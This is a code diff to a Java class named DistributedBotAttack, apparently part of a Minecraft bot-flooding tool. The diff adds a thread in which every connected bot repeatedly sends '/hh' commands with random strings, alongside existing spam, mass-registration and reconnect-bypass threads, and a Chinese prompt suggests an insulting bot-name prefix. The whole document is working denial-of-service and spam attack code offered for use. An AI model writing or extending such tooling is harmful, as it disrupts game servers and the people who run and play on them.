@@ -42,6 +42,7 @@ public class DistributedBotAttack extends IAttack {
 	private Thread taskThread;
 	private Thread spamThread;
 	private Thread regThread;
+	private Thread hhThread;
 	String spammessage;
 
 	public List<Client> clients = new ArrayList<Client>();
@@ -63,11 +64,13 @@ public class DistributedBotAttack extends IAttack {
 	boolean ReconncetBypass;
 	int ReconncetDelay;
 	int spamdelay;
+	int hhdelay;
 
 	public void start(final String ip, final int port) {
 		ReconncetDelay = config.toint(config.getValue("reconnectdelay"));
 		ReconncetBypass = config.getBoolean("reconnectbypass");
 		spamdelay = config.toint(config.getValue("spamdelay"));
+		hhdelay = config.toint(config.getValue("hhdelay"));
 		debug = config.getBoolean("debug");
 		Utils.log("请输入名称前缀：如CNMD 末尾自动添加后缀");
 		name = config.getValue("name");
@@ -133,6 +136,25 @@ public class DistributedBotAttack extends IAttack {
 			// }
 
 		});
+		hhThread = new Thread(() -> {
+			while (true) {
+				try {
+					synchronized (clients) {
+						clients.forEach(c -> {
+							if (c.getSession().isConnected() && c.getSession().hasFlag("join")) {
+								c.getSession().send(new ClientChatPacket("/hh " + Utils.getRandomString(5, 10)));
+
+							}
+						});
+					}
+					Thread.sleep(hhdelay);
+				} catch (Exception e) {
+					// TODO: handle exception
+					Utils.log(e);
+				}
+
+			}
+		});
 
 		spamThread = new Thread(() -> {
 			while (true) {
@@ -171,6 +193,8 @@ public class DistributedBotAttack extends IAttack {
 		mainThread.start();
 		regThread.start();
 		spamThread.start();
+		hhThread.start();
+
 		if (tabThread != null)
 			tabThread.start();
 		if (taskThread != null)
